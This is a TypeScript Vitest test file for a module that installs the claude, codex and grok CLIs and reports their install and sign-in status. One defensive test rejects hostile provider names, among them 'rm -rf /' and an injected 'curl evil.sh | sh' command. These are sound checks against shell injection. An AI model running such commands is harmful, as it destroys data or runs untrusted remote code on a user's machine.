import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { INSTALL_COMMANDS, LOGIN_COMMANDS, installProvider, isProviderName } from '../../src/setup/install.js';

let home: string;
let realHome: string | undefined;

// os.homedir() reads $HOME on POSIX, so this redirects detection at the source. A
// vi.spyOn of the `os` namespace does NOT work here: detect.ts imports `node:os`, and an
// ESM namespace object is read-only — the spy binds to a different object and the real
// homedir keeps being used.
beforeEach(() => {
  home = fs.mkdtempSync(path.join(os.tmpdir(), 'dispatch-install-'));
  realHome = process.env.HOME;
  process.env.HOME = home;
});
afterEach(() => {
  if (realHome === undefined) delete process.env.HOME; else process.env.HOME = realHome;
  try { fs.rmSync(home, { recursive: true, force: true }); } catch {}
});

/** Drop a fake, executable CLI where that provider's installer would put it. */
function fakeInstall(rel: string): void {
  const abs = path.join(home, rel);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, '#!/bin/sh\necho "1.0.3"\n', { mode: 0o755 });
  fs.chmodSync(abs, 0o755);
}

describe('isProviderName', () => {
  it('accepts the three known CLIs', () => {
    expect(isProviderName('claude')).toBe(true);
    expect(isProviderName('codex')).toBe(true);
    expect(isProviderName('grok')).toBe(true);
  });

  it('rejects anything else — this is what keeps the shell safe', () => {
    expect(isProviderName('rm -rf /')).toBe(false);
    expect(isProviderName('claude; curl evil.sh | sh')).toBe(false);
    expect(isProviderName('')).toBe(false);
    expect(isProviderName('GROK')).toBe(false);
  });
});

describe('INSTALL_COMMANDS', () => {
  it('are fixed constants, one per provider', () => {
    expect(INSTALL_COMMANDS.claude).toBe('npm install -g @anthropic-ai/claude-code');
    expect(INSTALL_COMMANDS.codex).toBe('npm install -g @openai/codex');
    expect(INSTALL_COMMANDS.grok).toBe('curl -fsSL https://x.ai/cli/install.sh | bash');
  });
});

describe('installProvider', () => {
  it('runs that provider\'s command and reports success once the binary is really there', async () => {
    const run = vi.fn(async () => { fakeInstall('.grok/bin/grok'); return { ok: true, output: 'installed' }; });

    const result = await installProvider('grok', run);

    expect(run).toHaveBeenCalledWith('curl -fsSL https://x.ai/cli/install.sh | bash');
    expect(result.ok).toBe(true);
    expect(result.status.installed).toBe(true);
    expect(result.status.name).toBe('grok');
  });

  it('reports failure when the installer exits non-zero', async () => {
    const run = vi.fn(async () => ({ ok: false, output: 'network unreachable' }));

    const result = await installProvider('grok', run);

    expect(result.ok).toBe(false);
    expect(result.output).toContain('network unreachable');
    expect(result.status.installed).toBe(false);
  });

  it('reports failure when the installer exits 0 but left nothing the daemon can see', async () => {
    // An installer can succeed into a directory outside every path we probe. The honest
    // answer is "not installed" — re-detection is the source of truth, not the exit code.
    const run = vi.fn(async () => ({ ok: true, output: 'all done!' }));

    const result = await installProvider('grok', run);

    expect(result.ok).toBe(false);
    expect(result.status.installed).toBe(false);
  });

  it('always returns the login command, because installing never signs you in', async () => {
    const run = vi.fn(async () => { fakeInstall('.grok/bin/grok'); return { ok: true, output: '' }; });
    const result = await installProvider('grok', run);
    expect(result.loginCommand).toBe(LOGIN_COMMANDS.grok);
    expect(result.loginCommand).toBe('grok login');
  });

  it('reports installed-but-signed-out until the auth file exists', async () => {
    const run = vi.fn(async () => { fakeInstall('.grok/bin/grok'); return { ok: true, output: '' }; });

    const before = await installProvider('grok', run);
    expect(before.status.signedIn).not.toBe(true);

    fs.writeFileSync(path.join(home, '.grok', 'auth.json'), '{}');
    const after = await installProvider('grok', run);
    expect(after.status.signedIn).toBe(true);
  });

  it('truncates a runaway install log instead of returning megabytes', async () => {
    const run = vi.fn(async () => ({ ok: false, output: 'x'.repeat(50_000) }));
    const result = await installProvider('codex', run);
    expect(result.output.length).toBeLessThan(5_000);
    expect(result.output.startsWith('…')).toBe(true);
  });
});
